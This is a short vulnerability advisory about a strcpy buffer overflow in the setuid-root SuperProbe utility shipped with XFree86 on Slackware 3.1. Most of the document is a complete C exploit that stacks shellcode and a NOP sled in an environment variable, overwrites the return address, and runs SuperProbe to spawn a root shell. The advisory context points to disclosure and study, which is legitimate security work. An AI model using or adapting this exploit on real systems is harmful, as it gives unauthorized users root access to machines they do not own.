source: http://www.securityfocus.com/bid/364/info


superprobe is an program supplied with XFree86 that helps determine video hardware. It is shipped with Slackware Linux 3.1 and is installed setuid root. There is an exploitable strcpy buffer overflow in the TestChip() function which allows for a trivial local root compromise.


 /*

 * SuperProbe buffer overflow exploit for Linux, tested on Slackware 3.1

 * Copyright (c) 1997 by Solar Designer

 */

 #include <stdio.h>

 #include <stdlib.h>

 #include <unistd.h>

 char *shellcode =

 "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"

 "\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd"

 "\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40"

 "\x31\xdb\xcd\x80/"

 "/bin/sh"

 "0";

 char *get_sp() {

 asm("movl %esp,%eax");

 }

 #define bufsize 8192

 #define alignment 0

 char buffer[bufsize];

 main() {

 int i;

 for (i = 0; i < bufsize / 2; i += 4)

 *(char **)&buffer[i] = get_sp() - 2048;

 memset(&buffer[bufsize / 2], 0x90, bufsize / 2);

 strcpy(&buffer[bufsize - 256], shellcode);

 setenv("SHELLCODE", buffer, 1);

 memset(buffer, 'x', 72);

 *(char **)&buffer[72] = get_sp() - 6144 - alignment;

 buffer[76] = 0;

 execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer, NULL);

 }